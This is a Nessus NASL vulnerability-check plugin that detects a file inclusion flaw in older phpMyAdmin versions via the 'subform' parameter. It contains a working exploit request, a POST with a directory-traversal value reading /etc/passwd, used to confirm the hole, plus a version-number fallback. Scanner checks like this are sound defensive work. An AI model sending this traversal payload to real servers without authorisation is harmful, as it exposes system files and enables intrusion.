#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is prone to a
local file inclusion flaw. 

Description :

The version of phpMyAdmin installed on the remote host allows
attackers to read and possibly execute code from arbitrary files on
the local host because of its failure to sanitize the parameter
'subform' before using it in the 'libraries/grab_globals.lib.php'
script. 

See also : 

http://securityreason.com/achievement_securityalert/24
http://www.phpmyadmin.net/home_page/security.php?issue=PMASA-2005-4

Solution : 

Upgrade to phpMyAdmin 2.6.4-pl2 or later.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";


if (description) {
  script_id(19950);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3299");
  script_bugtraq_id(15053);

  name["english"] = "PHPMyAdmin subform File Inclusion Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for subform file inclusion vulnerability in PHPMyAdmin";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Make sure an affected script exists.
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  # If it does...
  if (egrep(pattern:'<link rel="stylesheet" [^>]+/phpmyadmin\\.css\\.php', string:res)) {
    # Try to exploit the flaw to read a file.
    postdata = string(
      "usesubform[1]=1&",
      "subform[1][redirect]=../../../../../../../../../etc/passwd"
    );
    req = string(
      "POST ", dir, "/index.php?plugin=", SCRIPT_NAME, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if there's an entry for root.
    if (egrep(string:res, pattern:"root:.*:0:[01]:")) {
      if (report_verbosity > 0) {
        report = string(
          desc["english"],
          "\n",
          "Plugin output :\n",
          "\n",
          res
        );
      }
      else report = desc["english"];
      security_warning(port:port, data:report);

      exit(0);
    }
  }
  # Check the version number in case open_basedir is restricting access.
  if ( ( report_paranoia > 1 ) && (ver =~ "^([01]\.|2\.([0-5]\.|6\.([0-3]|4($|.*pl1))))") ) {
    report = string(
      desc["english"],
      "\n",
      "Plugin output :\n",
      "\n",
      "***** Nessus has determined the vulnerability exists on the remote\n",
      "***** host simply by looking at the version number of phpMyAdmin\n",
      "***** installed there.\n"
    );
    security_warning(port:port, data:report);
  }
}

